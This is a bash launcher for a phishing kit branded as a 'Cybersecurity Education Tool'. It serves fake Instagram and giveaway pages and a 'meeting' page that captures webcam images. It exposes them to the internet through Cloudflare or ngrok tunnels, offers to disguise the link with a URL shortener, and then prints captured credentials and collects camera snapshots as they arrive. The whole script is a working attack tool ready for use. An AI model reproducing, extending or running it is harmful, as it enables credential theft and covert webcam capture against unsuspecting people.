#!/bin/bash

############################################
# COLORS
############################################

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
NC='\033[0m'

############################################
# CREATE REQUIRED FOLDERS
############################################

mkdir -p logs
mkdir -p logs/cam

############################################
# DEPENDENCY CHECK
############################################

check_command() {

if ! command -v $1 &> /dev/null
then

echo -e "${Y}[*] Installing $1 ...${NC}"

sudo apt update > /dev/null 2>&1
sudo apt install $2 -y > /dev/null 2>&1

echo -e "${G}[+] $1 installed${NC}"

else

echo -e "${G}[+] $1 found${NC}"

fi

}

clear

echo -e "${C}Checking dependencies...${NC}"

check_command php php
check_command curl curl
check_command wget wget
check_command unzip unzip

############################################
# NGROK CHECK
############################################

if [ ! -f "./ngrok" ]; then

echo -e "${Y}[*] Downloading ngrok...${NC}"

wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1

unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1

rm ngrok-v3-stable-linux-amd64.zip

chmod +x ngrok

echo -e "${G}[+] ngrok ready${NC}"

fi

############################################
# CLOUDFLARED CHECK
############################################

if ! command -v cloudflared &> /dev/null
then

echo -e "${Y}[*] Installing cloudflared...${NC}"

wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb > /dev/null 2>&1

sudo dpkg -i cloudflared-linux-amd64.deb > /dev/null 2>&1

rm cloudflared-linux-amd64.deb

echo -e "${G}[+] cloudflared ready${NC}"

fi

clear

############################################
# BRANDING
############################################

echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool${NC}"
echo -e "  ${Y}Developer:${NC} ${G}Aadit${NC}"
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

############################################
# TEMPLATE MENU
############################################

echo
echo -e "${G}Select Template:${NC}"

echo -e "  ${B}[1]${NC} Instagram "

echo -e "  ${B}[2]${NC} Online Giveaway"

echo -e "  ${B}[3]${NC} Giveaway "

read -p "Selection > " option

ROOT_DIR="$(pwd)"

if [[ $option == "1" ]]; then

TARGET_DIR="$ROOT_DIR/modules/insta"
LOG_FILE="$ROOT_DIR/logs/output.txt"

elif [[ $option == "2" ]]; then

TARGET_DIR="$ROOT_DIR/modules/meeting"
CAM_DIR="$ROOT_DIR/logs/cam"

elif [[ $option == "3" ]]; then

TARGET_DIR="$ROOT_DIR/modules/giveaway"
LOG_FILE="$ROOT_DIR/logs/output.txt"

else

echo -e "${R}Invalid option${NC}"
exit 1

fi

############################################
# TUNNEL MENU
############################################

echo
echo -e "${G}Select Tunnel:${NC}"

echo -e "  ${B}[1]${NC} Localhost"

echo -e "  ${B}[2]${NC} Cloudflare"

echo -e "  ${B}[3]${NC} Ngrok"

read -p "Selection > " tunnel

############################################
# STOP OLD PROCESSES
############################################

pkill php > /dev/null 2>&1
pkill ngrok > /dev/null 2>&1
pkill cloudflared > /dev/null 2>&1

############################################
# START PHP SERVER
############################################

echo -e "${Y}Starting PHP server...${NC}"

php -S 127.0.0.1:8080 -t "$TARGET_DIR" > /dev/null 2>&1 &

sleep 3

############################################
# START TUNNEL
############################################

if [[ $tunnel == "1" ]]; then

FINAL_URL="http://127.0.0.1:8080"

elif [[ $tunnel == "2" ]]; then

echo -e "${Y}Starting Cloudflare tunnel...${NC}"

cloudflared tunnel --url http://127.0.0.1:8080 > cloudflare.log 2>&1 &

echo -e "${C}Waiting for Cloudflare URL...${NC}"

while ! grep -q trycloudflare.com cloudflare.log
do
sleep 2
done

FINAL_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cloudflare.log)

elif [[ $tunnel == "3" ]]; then

echo -e "${Y}Starting Ngrok tunnel...${NC}"

./ngrok http 8080 > /dev/null 2>&1 &

echo -e "${C}Waiting for Ngrok URL...${NC}"

until curl -s http://127.0.0.1:4040/api/tunnels | grep -q https
do
sleep 2
done

FINAL_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')

else

echo -e "${R}Invalid tunnel option${NC}"
exit 1

fi

############################################
# SHOW URL
############################################

echo
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e "${G}URL:${NC} ${W}$FINAL_URL${NC}"

echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

############################################
# MASK OPTION
############################################

echo
read -p "Mask URL using shortener? (y/n): " mask

if [[ $mask == "y" ]]; then

python3 tools/masker.py "$FINAL_URL"

fi

echo
echo -e "${C}Waiting for data... CTRL+C to stop${NC}"

############################################
# LISTENER LOOP
############################################

while true
do

if [[ $option == "1" || $option == "3" ]]; then

if [[ -s "$LOG_FILE" ]]; then

echo
echo -e "${G}Data received:${NC}"

cat "$LOG_FILE"

> "$LOG_FILE"

fi

elif [[ $option == "2" ]]; then

for img in "$CAM_DIR"/*.png; do

[ -e "$img" ] || continue

echo -e "${C}Image saved in logs/cam${NC}"

mv "$img" "$CAM_DIR/received_$(basename "$img")"

done

fi

sleep 2

done